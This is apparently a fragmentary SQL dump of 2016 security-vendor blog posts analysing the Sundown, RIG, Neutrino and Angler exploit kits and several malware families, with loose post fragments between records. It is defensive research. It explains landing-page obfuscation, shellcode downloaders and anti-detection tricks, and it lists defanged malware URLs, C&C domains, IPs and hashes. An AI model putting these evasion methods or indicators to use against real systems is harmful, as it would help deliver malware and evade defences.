in the underground market and, unfortunately, using them is fairly easy, requiring little technical knowledge. In spite of the increased use of specialized tools, the keylogger remains a common, and quite potentially damaging, tool.

We recently encountered a malvertising chain serving both EKs on subsequent visits, and decided to compile a quick look at the these cases.             Figure 1 - Graph showing the malvertising chains         Sundown      Sundown Exploit Kit, as we have covered before, is relatively new to the EK scene. The developers aren\'t wasting much time however, and have been seen to make rapid changes to the kit, marking a general trend towards increasing complexity. We have seen this in all aspects of the kit, including their gate/redirector usage, leveraging of malvertising, landing page features and formats, and hosting infrastructure used.    Previously, we were seeing Sundown traffic mostly coming from infected websites, using very simple gates to redirect to the landing page. The domain \"tdconsultantspecialists.com\" was the main Sundown redirector we observed, until they moved to \"corporatecompanybus.com\".             Figure 2 - Sundown cycle from corporatecompanybus.com featuring domain shadowing         Following (or perhaps in conjunction with) the gate change, Sundown has moved further into malvertising, which now makes up the majority of our observed Sundown traffic. Sundown has also made some changes to their hosting infrastructure choices, and is looking like a more \"professional\" cybercrime operation recently, with what appear to be shadowed domains (registered at GoDaddy) utilized for landing page hosts. Subdomains are created on the shadowed accounts, yielding URL patterns that can make Sundown traffic look very much like RIG.             Figure 3 - Excerpt of recent Sundown landing page URLs         We\'ve also begun seeing an interesting divergence in the hosting of landing page and payloads. In a recent case, the landing pages and payloads were served from different IPs and hostnames, however the case we present today features the same IP but different hostnames on different shadowed domains.             Figure 4 - Sundown EK cycle showing usage of different hostnames for payload delivery         While the hosting structure of Sundown has seen an improvement, the rapid development has been most evident in the landing page code. In July, we noticed Sundown deployed the latest IE exploit, CVE-2016-0189, as the sole payload of the landing page.              Figure 5 - Sundown EK briefly used CVE-2016-0189 as the sole landing page element         This was not to last, as they quickly integrated the exploit into the more typical Sundown landing page format. In a more recent episode, Trustwave\'s Spiderlabs spotted the addition of a fingerprinting code, however we have not seen this feature in our captured cycles, so the operators may have opted for the simpler, non-fingerprinted landing page since then.             Figure 6 - Sundown\'s new obfuscation layer, part 1         We spotted another change on the Sundown landing page: an additional obfuscation layer implemented in the PHP backend code. We encountered this last week and were also able to get a sneak peek at the backend code, which showed the implementation of a dynamic obfuscation layer. This layer uses a randomized 4-byte key in a simple XOR routine, with randomized variable names added to hinder analysis. The feature is quite simple, though, and perhaps for this reason, the authors ultimately removed the feature just as quick as they added it. Perhaps this is part of some kind of A/B feature-testing regime.        Figure 7 - Sundown\'s new obfuscation layer, part 2             RIG         In the wake of both Angler and Nuclear disappearing, RIG has taken a dominant position in the EK landscape. The RIG operators appear content, however, to iterate more slowly, with changes to the EK itself happening less frequently. That said, RIG EK authors have now made noticable changes to the landing page structure.        Figure 8 - RIG EK landing page with a brand new look         Where the RIG landing page was previously only lightly obfuscated, relying primarily on base64-encoded data, the new landing page is somewhat reminiscent of a previous Angler format, with an extended-ascii twist. Despite looking highly obfuscated at first glance, the landing page is easily decoded in two stages.        Figure 9 - The right pane features the fully decoded landing page             Besides RIG\'s inclusion into the EITest and (pseudo) Darkleech campaigns, we would also like to point out the changing hostname patterns being used. Some cases have used hostnames that might suggest a closer partnership with EITest (using 2 level hostnames in the .top TLD, similar to typical EITest-Neutrino cycles), but the historic pattern of [two-letter subdomain].[domain-shadowed-account].[tld] has been tossed aside. RIG has also been branching out into new hosting provider networks, with Host Sailor, OVH SAS, and OOO NPO Relcom joining Webzilla B.V. and OOO IT-Grad.         Conclusion    At this point, it\'s clear that the exploit kit landscape has been thoroughly shaken up since the disappearance of Angler and Nuclear (as we have covered in our round-ups and other EK-related blogs). This small update is meant to give a quick look at the latest techniques and trends used by RIG and Sundown. We will continue to monitor the situation, and provide updates to the community as usual.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/quick-look-recent-malvertising-exploit-chains');

Exploit kits are rapidly deployable software packages designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of exploit kits offer their services for sale, distributing malware for other malicious actors.    Find our previous roundup here.    Neutrino Exploit Kit    In our previous roundup, we noted that the EITest campaign had begun redirecting primarily to Neutrino landing pages since Angler exploit kit activity abruptly stopped in early June 2016. EITest gates have continued redirecting to Neutrino landing pages, as well as RIG, throughout Summer 2016.        Figure 1: Neutrino hits, July - August 2016        Figure 2: Neutrino heatmap>    Neutrino landing pages still primarily use top TLD names and target Adobe Flash Player. The majority of Neutrino hosts observed were hosted in Western Europe and North America.    Starting in mid-June, the EITest Neutrino landing pages began distributing CryptXXX ransomware payloads. Prior to its shutdown, Angler was the main distributor of CryptXXX ransomware, and its stoppage caused a significant decline in CryptXXX infections. The increased usage of Neutrino to distribute CryptXXX helped fill the void left by Angler.        Figure 3: EITest gate redirect to Neutrino landing page>    In late July, EITest Neutrino landing pages began delivering CrypMIC ransomware, a new variant of CryptXXX. Non-EITest Neutrino campaigns involving malvertising continue to drop Tofsee, Gamarue, and various ransomware payloads.        Figure 4: CrypMIC payload from Neutrino infection chain    CrypMIC ransomware communicates with its C&C server via plain text over TCP port 443 (typically reserved for HTTPS/SSL traffic).        Figure 5: CrypMIC callback and ransom page        Figure 6: Example CrypMIC ransom instructions    RIG Exploit Kit    RIG remains active over several campaigns. The usual compromised sites and malvertising redirects are prevalent, as well as redirections to RIG from EITest gates.        Figure 7: RIG hits    Observed hits on RIG domains have been relatively consistent throughout the summer.        Figure 8: RIG heat map    The United States is still the largest host of RIG domains, though this summer we have seen an increase of hosts in Russia, as well as in several countries in Western Europe and the Americas.    The “topgunnphoto” gate mentioned in our previous roundup is still visible, but infection cycles from this gate declined through late July and early August. A thorough overview of recent RIG activity was published by Malwarebytes in late July, which illustrates several common RIG campaigns.    Not covered in the Malwarebytes article is a non-standard RIG campaign that originates with casino-themed malvertising. This campaign uses an atypical landing page URL scheme mentioned in the previous roundup, which breaks from the pattern of a two-character third-level domain.        Figure 9: RIG casino-based malvertising infection cycle    RIG continues to drop Tofsee payloads and a new variant of Zeus, as we have previously described. Recently, RIG has started dropping the Gootkit banking trojan through the EITest campaign, as well as Vawtrak and Cerber payloads.    Other Exploit Kits    Magnitude Exploit Kit    Magnitude is a long-running exploit kit that has been active since October 2013. Through summer, it has continued its recent trend of dropping Cerber ransomware payloads through malvertising campaigns.        Figure 10: Magnitude infection cycle    Angler Exploit Kit    Angler EK shut down in early June 2016, and is now considered to be defunct. EITest gates which had been primarily redirecting to Angler landing pages have since begun redirecting to Neutrino and RIG landing pages.    Nuclear Exploit Kit    Nuclear has had no activity since late April 2016, and is now considered to be defunct. Some compromised site injection artifacts are still observed, but no active redirectors or gates.    Sundown Exploit Kit    In early July, Zscaler’s ThreatLabZ published an article analyzing the activity of Sundown over the previous month. Most recently, variations to Sundown’s landing page obfuscation structure have been observed, and Sundown has begun dropping a variant of the Kasidet backdoor with modified callback protocols.        Figure 11: Sundown landing page excerpt    In early July, Sundown EK quickly integrated the recently-published exploit CVE-2016-0189, a VBScript memory corruption vulnerability in IE11, into new landing pages. The standard Sundown landing page was replaced entirely with a modified version of the open source POC for the exploit.        Figure 12: Sundown EK using CVE-2016-0189    Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of a user to access his or her files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as these, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-summer-2016');

The keylogger payload was configured to relay the stolen information back to the cyber-squatted domain, which had been registered two months prior to the attack.\r\n\r\nThe malicious domain in this case was “diodetechs[.]com” trying to imitate diodetech[.]com, which belongs to a legitimate consulting firm that offers a variety of services to global enterprises. We notified Diode technologies about the attack earlier this month and the offending domain has been suspended.\r\n\r\nAgentTesla keylogger\r\n\r\nAgentTesla is an advanced keylogger with features like clipboard logging, screen keylogging, screen capturing, and extracting stored passwords from different web browsers. It is written in .NET and supports all versions of the Windows operating system. In this blog, we will analyze the AgentTesla payload that was used in the attacks involving cyber-squatted domain ‘diodetechs[.]com’. \r\n\r\n\r\n\r\nFigure 1: Subscription packages of AgentTesla keylogger\r\n\r\nThe Infection cycle\r\n\r\nThe infection cycle typically starts with a malicious office document that arrives as an e-mail attachment.

The malware waits for victims to open the Google Play store and then displays a fake html overlay page asking for credit card information. The fake page will not go away until the user provides the payment information.\r\n\r\nIn March 2014, we noticed newer variants targeting financial organizations in Germany. Upon infection, Marcher would inspect the victim’s device and send a list of all installed apps to its command and control (C&C) server. If the malware found any German financial apps installed in the device, it would show a fake page asking for credentials of that particular institution. Unaware that the login page is a fake, the victim would provide their credentials where they would then be sent to the malware’s C&C. The malware would also show a fake Google Play payment page if the infected device did not have any German financial firm apps. We covered one such sample in a previous blog, see here .\r\n\r\nMarcher then started targeting financial firms in Australia, France, Turkey and The United States. Some Marcher samples were observed targeting PayPal as well.\r\n\r\nRecently, Marcher added United Kingdom to its hit list, as seen by TrendMicro.\r\n\r\n\r\nPreviously, Marcher was distributed through fake Amazon and Google Play store apps. We’ve also seen it delivered through a fake porn site that posed as a Chrome update. This month, we observed another new change in the Marcher malware campaign where it is being delivered as a fake Android firmware update. We discovered the payload dropped as “Firmware_Update.apk”. An HTML page serving this malware scares the victim by showing that the device is vulnerable to viruses and to prevent personal data theft, prompting them to install the fake update.\r\n\r\n                                                       \r\n\r\n                                                         Fake update page\r\n\r\nTo perform its malicious activity upon installation, Marcher will ask for administrative access.\r\n\r\nIn 2013, Marcher was only targeting Russian mobile users; however, in the recent samples the author implemented checks to find out if the infected device is from CIS/SIG. It will stop its activity if the device belongs to CIS/SIG territory. Generally, the malware author does this check to avoid any legal cases from its own territory. Such checks indicate that the malware may have been authored and maintained from CIS/SIG countries.

The game is currently available in multiple countries all over the globe; however, there are still a handful of countries eagerly waiting for its release. In turn, attackers are taking advantage of the hype and are scamming large numbers of mobile users.    Recently at ThreatlabZ we came across an Android SMS Trojan disguised as the Pokémon GO app in one of our threat feeds. This malware secretly sends SMS to premium numbers, which costs money to the victim.       Technical Analysis:    We have observed that this malware was dropped from the following URL.      	http[:]//taigamesvui[.]xyz/sms/pokemongo[.]apk       The malware installs itself with the legit Pokémon GO application icon so that the users are not suspicious as seen below:       Icon    Upon clicking the icon, malware shows the following page to victim.         Downloading APK    Once the user clicks on the first button, malware starts downloading another Pokémon Go game from the following URL.      	http[:]//waptuoitre[.]net/dulieu/pokemongo[.]apk      In addition to downloading the APK from the URL listed above, the malware secretly sends SMS to premium numbers. Observe the following code which depicts the malicious activity.        JavaScript code    Unlike common android malware, this malware performs malicious activity from a HTML page residing in the asset folder of the malware package. The “Android.send” function is defined in the DEX file. This function is trigged by the HTML page by passing necessary arguments once the user clicks the first button.    Following is the function responsible for sending SMS to premium numbers:        Send SMS code routine        SMS    The downloaded application is also found to be a fake app and crashes in all the lab devices. Seeing that, the victim will probably try to open the malicious app multiple times triggering malicious routine each time which includes sending message to premium numbers costing the victim more money.    Pokémon GO Clickfraud    As we saw in the above case, the fake app is capable of scamming gamers financially by sending SMS messages to premium numbers. However, it is important to note that this fake application never made it to Google PlayStore. However, we did see an aggressive auto-clicker malware variant leveraging Pokémon GO lure making its way to Google\'s PlayStore. The app was named \"Install Pokémon GO,\" which got our attention with a huge number of negative reviews and comments from more than 2500+ users. Google was quick to remove this app.The screenshot below shows the icon of installed app:           AutoClicker using Pokémon GO Icon    The app disguised itself as a guide to installing Pokémon GO from third party store ApkMirror, but in reality it was doing nothing more than displaying a banner for few seconds and started its aggressive auto clickers.      The screenshot below shows the screen displayed to victim for few seconds regarding how to install Pokémon GO.      Installation Banner    After few seconds it starts displaying ads on main screen as shown in screenshot above.  Additionally, the app launches the browser, opens several links automatically, and starts auto clicking activity.    The screenshot below shows several links opened within a very short span of time. It also shows the type of ads loaded by the auto clicker app:        Auto clicked links and displayed Ads    The damage that such apps can inflict is less severe when compared to banking Trojans or Ransomware, but since it leaks victim\'s sensitive information like device info, SIM details, timezones and location it may serve as a gateway for further attacks and infection.    Pokémon GO Privacy issue    The original Pokémon GO application has also gone through scrutiny surrounding privacy issues because of overly aggressive access permissions than it requires.  iOS version of the Pokémon GO originally required full access to user’s Google account when the user signs on via Google account. Such an approval grants all access of user’s Google account to the game. Considering the personal and the financial information stored over Google accounts, such access of the data to third-party servers will create a serious issue in case of data theft on Pokémon GO servers.    Meanwhile Niantic, Inc (Developer of the Pokémon GO) published a statement saying that this happened due to coding errors and they have fixed it, as the game needs only player’s Gmail account and user ID. The company also promised that none of the unwanted user data has been accessed yet.     Don’t let the malware authors exploit this temptation of playing Pokémon GO. As of now Niantic, Inc has fixed the privacy related issues in new Pokémon GO app. We recommend downloading game from authorized and legit sources only.     Have a happy and safe gaming.     Writeup by - Viral Gandhi, Shivang Desai', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/pokemon-go-pikachu-thunder-shocks-users-wallet-and-personal-life');

In the cases we present here, we have seen RIG Exploit Kit dropping Qakbot as well as Neutrino Exploit Kit dropping CryptXXX.\r\n\r\nCase 1: The first case begins with a user looking to make an Olympic themed cake, and getting served with the RIG Exploit Kit.\r\n\r\n\r\n\r\nThe compromised site contains a malicious inject hidden in the jquery.js file that redirects the user to a gate. This gate redirects the user to the RIG landing page, which loads a malicious SWF.\r\n\r\nFollowing exploitation, a payload encrypted with a simple XOR cipher is downloaded onto the victim’s system. The malware in question is the infamous worm, Qakbot. In addition to attempting to spread itself across network shares, Qakbot can allow remote access to the user’s system, steal information from the victim\'s machine and exfiltration to the attacker’s remote server, among other functions.\r\n\r\n\r\n\r\nThe threat installs itself as a service named \"Remote Procedure Call (RPC) Service\" to mask its presence and ensure persistence.\r\n\r\nCase 2: Our second case involves the compromised South Africa Gymnastic Federation website, which is leading users to Neutrino Exploit Kit via an injected script.\r\n\r\nWhen examining the website\'s code, we can see the Flash object for the EITest redirector embedded towards the bottom of the page.\r\n\r\n\r\n\r\nFollowing the EITest gate is a Neutrino landing page and SWF payload.

Users should always make sure that Adobe Flash Players Auto-Update feature is enabled, and it is highly recommended to leverage click-to-play functionality in web browsers. These steps can greatly reduce users\' exposure to vulnerabilities. As we get closer to the event, we expect to see a rise in threats and scams leveraging Olympics topics to target a large number of victims. \r\n\r\nZscaler\'s standard security checklist - Olympics Edition:\r\n\r\n\r\n	Inspect the source of emails with enticing shopping deals.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (98, 'Sundown Chronicles - Observations of an Exploit Kit\'s Evolution', 'Ed Miles', 'July 07, 2016', 'Since the apparent deaths of the Angler and Nuclear exploit kits, we have seen elevated activity from other groups. While RIG and Neutrino have been the primary actors in the void left by Angler and Nuclear, Sundown has also been active and making strides to increase its share of the exploit kit marketplace. We previously analyzed Sundown in January, and while it remains a significantly less sophisticated kit than other EKs, its developers are quickly working to develop the kit\'s capabilities. Recently, we have seen a flurry of iterative improvements in the exploit kit, similar to the behavior seen during our observation in January.    In this analysis, we will not detail the components of the Sundown EK since we covered that in our previous post, but will highlight the most interesting observations over the past month. See here for additional insight on Sundown\'s structure through June 30th.         2016-06-15    In the Sundown PCAP released on 2016-06-15, the landing page was a mish-mash of styles, including a section that appears ripped directly from RIG landing pages seen around April-May. This section actually caused some confusion as we saw detections for this version of the landing page mistakenly labeled RIG.               Fig 1 - Stolen RIG Code           Besides the stolen RIG code, the Sundown landing page featured a base64-encoded block to exploit Flash (though the Flash version detection code and trigger are unencoded), a second and larger base64-encoded block to exploit Flash (without external trigger code), an interesting VBScript payload that attempts to launch an additional script via wscript.exe, and a very lightly encoded VBScript payload for the GodMode vulnerability, wrapped in a JavaScript block.             Fig 2 - VBScript wrapped in JavaScript             2016-06-27    While reviewing Sundown activity, we found that the campaign was still active but the landing page structure changed enough to evade our previous signatures. At this point, Sundown had abandoned the RIG-ripoff tactic, and stuffed nearly everything into base64-encoded blocks with an overabundance of <body> tags.             Fig 3 - New Sundown landing page on the left, old page on the right           For some reason, a completely unencoded Flash object remained on the landing page, which included a nice shellcode payload in a FlashVar named \'exec\'! The shellcode is fairly basic, using urlmon.dll to fetch a malware payload.             Fig 4 - Shellcode downloads a malware payload from the highlighted URL         2016-06-30    Close monitoring continued and although there weren\'t any notable changes to the landing page, we did some testing with an old VM that produced an interesting result. We did further testing and found that user-agents claiming to be Internet Explorer 6 caused a basic PHP backend to be dumped to the browser. This uncovered backend shows the construction of some static objects to serve on the landing page and a switch statement based on the results of a simple, but flawed, IE version check. The IE check causes the backend to select between two different payloads.           Fig 5 - PHP backend code dumped in the landing page response           2016-07-01    Going into the long weekend for our US office, we wanted to keep a close eye on Sundown, and noticed a few new changes. First off, the landing page structure changed, with a major inflation in code size. The landing page makes multiple uses of the JavaScript string replace function to translate the inflated landing page data back to percent escaped values to be decoded with the unescape function.           Fig 7 - String replace calls replace strings with digits           Besides the landing page inflation, we also began seeing delivery of a RAT known as NetWire or NetWiredRC. Identification was easy thanks to the thorough analysis and documentation by CIRCL, MalwareMustDie, and others.             Fig 8 - Multiple strings related to data theft from various sources           However, this seems to be a slightly updated version of NetWire. It\'s previously been pointed out that the RAT uses a 76-way switch statement for parsing commands from the server, while the sample Sundown delivered provided for 82 cases.             Fig 9 - IDA graph of the command parsing switch logic           The RAT was configured to communicate with 86t7b9br9.ddns[.]net (resolving to 62.210.14[.]117) on port 8980, but the server was rejecting connections at the time of analysis.           Fig 10 - C&C hostname resolves but rejects connection attempts        2016-07-05    On checking Sundown again, we found some small changes compared to the landing page seen on July 1st. The same inflationary tactics are used on the landing page but the landing page comes in a few hundred kilobytes smaller, thanks in small part to stripping of many CRLFs from the HTML.             Fig 11 - Sundown\'s landing page starts looking squashed without CRLFs           We noticed a very interesting change to the payload at this point: the exploit kit was actually delivering unmodified copies of PuTTY version 0.66. Visit infected website, receive PuTTY! We considered this could actually be useful if it wasn\'t likely to be a simple test payload.             Fig 12 - PuTTY is the new calc?             With no interesting payload to investigate, we decided to do some poking at the infrastructure. We went looking for the backend admin panel, but instead we found a nice splash page. When browsing the landing page URL with no parameter, a simple HTML page with a meta tag meant to load another HTML page from a base64 encoded data tag.            Fig 13 - The meta tag of the matryoshka splash page           It turned out that the HTML didn\'t actually load properly (it appears the meta refresh directive doesn\'t work in this case), but since the actual splash page was contained in the previously mentioned data parameter, we decoded the base64 blob. This turned out to be another HTML page, this time with data:image objects for background and foreground images, with the foreground image showing a logo for a \"Yugoslavian Business Network\".             Fig 14 - Is Sundown really the work of the YBN?           This Russian Business Network inspired group may or may not be responsible for Sundown, but there does appear to be a German language group offering coding services on forums under the YBN moniker, with many commenters voicing their pleasure with the services.           Fig 15 - Everyone loves a good logo, whether its the white-hat infosec industry or an underground black-hat forum           2016-07-06    Checking on Sundown again, we found yet more changes to the landing page. This time, the changes to the landing page itself mostly comprised small structural changes, but the functionality of the encoded blocks was altered in an interesting way. Rather than being a self-contained landing page, additional javascript payloads would be fetched from the server. Both the landing page and the secondary payloads used the same encoding/inflation technique mentioned above. Where the previous single-file landing pages were initially between 20k and 100k, then multiple megabytes, we began seeing primary landing pages of 12k supported by javascript payloads in several different sizes: approximately 300kB, 1.5mB, and 4mB.           Fig 16 - The landing page itself has shrunk, but now there are huge secondary JavaScript payloads           In addition to the newly modularized landing page, we also discovered that Sundown\'s PuTTY service was shutdown to make way for actual malware delivery once again, with NetWire returning to the party.         2016-07-07    We found a new malware payload: a version of Kasidet that adds a base64-encoding layer to its HTTP callbacks. This is new behavior compared with our previous analysis, where we reported it being dropped by malicious spam. Callbacks were attempted to hhggffppgttt[.]ru (resolving to 185.127.25.173 at the time of analysis), including the submission of a screenshot. Cleverly, the C&C server response with 404 status codes, but the 404 pages contained base64-encoded responses inside HTML comments.           Fig 17 - Kasidet commands and responses are easily decoded                Conclusion    Since the disappearance of the two top exploit kits, Angler and Nuclear, other kits will be fighting for market share. Sundown remains technically less sophisticated than others, but as we outlined in this analysis, Sundown\'s authors will surely keep making rapid updates to their code. Zscaler ThreatLabZ will continue monitoring the situation to ensure protection of Zscaler customers and provide relevant updates.         IOCs    Exploit Payloads      	E785F04EA98CBF3E42C46417E7DD7925  	226EE49F76023A29DD40D25675C37743  	9A9FFCE2F4462C2751FA5D76E180979C           EXE Payloads      	3bb6eba8ea26a293a238ba98a6731238  	78df54a2465fcd2c01fa14ab72d8cdfb  	bcb80b5925ead246729ca423b7dfb635  	af8b13866833c76b93a0d7b114c2671d  	33C9D1E56152E212367E9C5B01671E45  	AF8B13866833C76B93A0D7B114C2671D        Domains seen during analysis      	ewfihwfehiiwfhowfowfwfwfihfwhwffjwfjbfwjbkfw[.]xyz  	fdijgdlkfjgkldfjkldfjklgfjkldfjkldfjkldfgjkl[.]xyz  	djfnuihueifbnjosnfeurgbjorbjhucibyuc3dmxicnu[.]xyz  	dashpsadfoihpidfasdkiga[.]xyz  	dsafhpadfsihadfiph[.]xyz  	afihpiahfpiaefhpiadkiga[.]xyz  	afihaspifhpiasdhpidkiga[.]xyz  	doishdjsdjbsdgfiysgdfiysgdfigsdigfisdgfsgfig[.]xyz  	djfnuihueifbnjosnfeurgbjorbjhucibyuc3dmxicnu[.]xyz  	efiugfhifuwgyfjdhgyjgyfcfxhfghchgjgugkhdijos[.]xyz  	sdahsadpihsdafpihfdkigasdj[.]xyz  	sgerpijhsger0pihgsdkigasdj[.]xyz  	afsidhipafshfapsihdkiga[.]xyz  	fdshdiufsbuibnjosdnvjobsdbiyhvsbibdnjvosfnos[.]xyz  	ouaefgoiafehoafeughoaufeoiuafseghgouaesf[.]faith  	sdahsadpihsdafpihf[.]xyz           IP addresses hosting Sundown domains      	185.93.185[.]226 (Check VirusTotal for more Sundown domains seen on this IP)  	185.93.185[.]230 (Check VirusTotal for more Sundown domains seen on this IP)', '', 'https://www.zscaler.com/blogs/research/sundown-chronicles-observations-exploit-kits-evolution');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (99, 'Top Exploit Kit Activity Roundup', 'Derek Gooley', 'June 24, 2016', 'Overview    The majority of malware and other computer security threats are delivered through web browsing. Exploit kits are rapidly deployable software packages designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of exploit kits offer their services for sale, distributing malware for other malicious actors. The intent of this paper is to highlight the recent activity in three of the most active exploit kits: Angler, RIG, and Neutrino.    Angler Exploit Kit    About Angler    Since appearing in 2013, Angler has continued to be responsible for a significant number of exploit kit infections. However, all Angler activity has dropped off since the second week of June 2016, causing many security researchers to suspect the end of this exploit kit. Angler is known for its frequently changing obfuscation methods that help it avoid detection.    Activity    Angler activity has remained fairly consistent through the spring of 2016. Active malvertising and compromised site campaigns remain active, with several new landing page formats introduced to evade detection. The long-running EITest campaign, up since 2014, and Darkleech campaign remain active.        Figure 1: Angler hits, April - May 2016    We saw 6,500 blocked Angler session in April through mid-May, 2016. Graph activity, as usual with exploit kits, matches western work-week browsing traffic, with significantly less hits on Saturdays and Sundays.        Figure 2: Blocked Angler Heatmap    As is common, the majority of Angler activity is seen in the United States. Western European countries also saw a relatively large number of Angler hits.    In mid-June 2016, Angler activity quickly dropped to a fraction of what was observed through the previous months. Many EITest campaign gates that were previously serving Angler are now only serving Neutrino or Sundown exploit kit landing pages. The decline in Angler activity has also resulted in a drop in CryptXXX infections, as Angler was a major source of distribution for that ransomware family.        Figure 3: Drop in Angler gates redirect activity in June 2016    Execution    At the beginning of April 2016, we observed a new variant of Angler landing page that leveraged a different form of obfuscation to evade detection. Angler activity throughout most of April and May remained consistent with these new patterns. The Angler domain associated with this campaign was also serving two separate landing pages with different JavaScript obfuscation techniques.        FIgure 4: Two landing pages served by the same Angler host    Angler is known to check for antivirus, analysis tools and sandbox product artifacts during the exploit cycle. If any DLLs or other artifacts from a list of AV engines are detected on the system, the exploit cycle is aborted and no malware payload is dropped.        Figure 5: AV and security product artifacts check    Angler primarily exploited vulnerabilities in Flash and Silverlight. Observed in April were Flash payloads using CVE-2016-1019, which affected Flash versions earlier than 21.0.0.182, and was actively targeting 20.0.0.306. We also saw campaigns targeting Silverlight 4.0.50524.0.    Malware Delivery    TeslaCrypt remained a common malware payload throughout April. Through early May, more recent Angler activity was seen dropping Bedep (a click-fraud bot and second-stage downloader) and CryptXXX in place of TeslaCrypt.         RIG Exploit Kit    About RIG    RIG exploit kit was discovered in 2014 and has targeted vulnerabilities in Java, Flash, and Silverlight. Attention was drawn to RIG in early 2015 when the source code for the exploit kit was leaked. After the leak, no major changes have been made to RIG’s architecture, yet RIG continues to be a popular exploit kit.    Activity    RIG continues to use the same URI scheme for its landing page resources and payload downloads. The majority of exploit cycles we have observed through April and May have come through the “topgunn” gate, which remains a major source of RIG EK infections.    In early June, some RIG campaigns began using a new format for its landing page domains, ditching the typical 2-character subdomain, as well as leveraging dynamic DNS providers.        Figure 6: New RIG landing page domains and dynamic DNS    Also recently observed was a change in the gate redirection flow for some exploit cycles. Compromised sites would first redirect to a .html document, then to a .phtml document (an uncommon filetype for PHP) with the same file name, and finally to the landing page.        Figure 7: RIG EK hits, April - May 2016    The end of April saw a decrease in RIG activity, but the number of infections have since increased through May and into June.        Figure 8: RIG landing page heatmap    The majority of landing pages we have observed are hosted in the United States.    Execution    The “Quad Power” gate activity, as described in our February 2016 blog has continued throughout April and May. The Quad Power gate uses .win, .top, .party, and .bid TLDs with the same second-level domain to serve landing pages.        Figure 9: Example RIG compromised site IFrame injection        Figure 10: Example RIG landing page    Malware Delivery    Earlier in 2016 RIG was observed to be dropping Tofsee backdoor as part of it\'s exploit cycle. RIG has also been recently observed dropping new Zeus payloads.    Malware Traffic Analysis has recently reported on several examples of RIG dropping Tofsee payloads. These findings are in line with the campaign we have observed since Fall 2015.    In early April we observed a malvertising campaign coming from the “Whoads” advertising service. This cycle led to RIG landing pages through an HTTPS connect and two levels of gates, and ultimately dropping Qbot as its final payload. This campaign is directly related to the overall rise in Qbot activity, as reported by BAE Systems and Kaspersky Threatpost.         Neutrino Exploit Kit    About Neutrino    Neutrino has a fairly simple architecture and doesn’t boast some of the more robust obfuscation and anti-sandboxing techniques as other exploit kits, yet it remains popular. Since the recent decline in Angler activity, Neutrino hits have spiked to fill the void. Neutrino is also commonly associated with various malvertising campaigns.    Activity    Neutrino is generally less active than RIG and Angler, but has been fairly constant since fall of 2015. Several new landing page hosts are set up each week, for both malvertising and compromised host campaigns. The EITest gate campaign, typically used for serving Angler, has also been seen serving Neutrino landing pages. Since Angler activity dropped off, EITest gates have been delivering Neutrino landing pages on most occassions.    The majority of campaigns we have observed in spring of 2016 used .top TLD domains for their landing pages and have targeted Adobe Flash Player. We have seen Neutrino landing pages dropping a variety of malware payloads, including Tofsee, Gamarue/Andromeda, Panda Banker, and various ransomware.        Figure 11: Neutrino hits, April - May 2016        Figure 12: Neutrino landing page heatmap    The majority of recent Neutrino hosts have been observed in the US, Italy, and Romania.    Execution    The Neutrino footprint on compromised sites is very small, typically just an IFrame tag at the very beginning of the page body content. Aside from the EITest campaign, gates are rarely used in Neutrino campaigns.        Figure 13: Compromised site IFrame injection    Neutrino landing pages lack the complex JavaScript obfuscation of Angler and other more advanced exploit kits. All landing pages we have observed this spring have used a similar format, with little more than a Flash Player object that loads a SWF exploit.    A SANS whitepaper published in April by Luis Rocha contains a detailed analysis of Neutrino architecture.        Figure 14: Neutrino landing page    Neutrino pages served through malvertising campaigns observed in April and May are also simply constructed. Malicious pages typically consist solely of an IFrame redirect to the landing page and sometimes a second IFrame to load actual advertising content.    Malware Delivery    In mid-May we observed a full exploit cycle from a malvertising campaign that ultimately dropped a Gamarue trojan payload. The page served by the advertising service contained an IFrame to load casino-themed advertising content and an IFrame that loaded an intermediate page from the same host to help mask the exploit kit presence. The intermediate page contained redirect to the Neutrino landing page. This campaign is further described in our recent blog.        FIgure 15: Malvertising campaign using intermediate page         Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of a user to access his or her files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as these, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup');

Malicious executables that leverage numerous techniques to detect the virtual environment and automated analysis systems are very common, but we are seeing an increasing trend of such techniques moving to the initial delivery vector (i.e. weaponized documents).\r\n\r\nIn this blog, we look at some of the anti-VM and anti-sandboxing techniques seen in the recent malicious documents including the newly added check of Microsoft Office RecentFiles count.\r\n\r\nWeaponized Documents & anti-VM tricks\r\n\r\nMalware authors leveraging documents with macros to download and install malware executable has been around for years; however, we are seeing a gradual evolution in these malicious documents making it harder for the security solutions to detect them proactively. ThreatLabZ has seen hundreds of new weaponized documents hit our sandbox on a regular basis:\r\n\r\n\r\n\r\nFigure 1: New unique malicious documents\r\n\r\nA macro is a piece of code, embedded inside Microsoft Office documents, written in a programming language known as Visual Basic for Applications (VBA). Microsoft Office\'s default security settings ensures that the macros are disabled by default; however, attackers are using clever social engineering tactics to lure the user into enabling the macros. Below are two recent examples:\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 2: Social engineering tactics to enable macro\r\n\r\nMalware authors are also making the macro code highly obfuscated and difficult to detect by signature based systems. In addition to highly obfuscated macros, malware authors are using multiple techniques in macros to detect the virtual environment and automated analysis systems as seen below:\r\n\r\nCheck #1 - Look for standard virtual environment strings\r\n\r\n\r\n\r\nFigure 3: Virtual environment strings check\r\n\r\nCheck #2 - Windows Management Instrumentation (WMI) interface to identify virtual 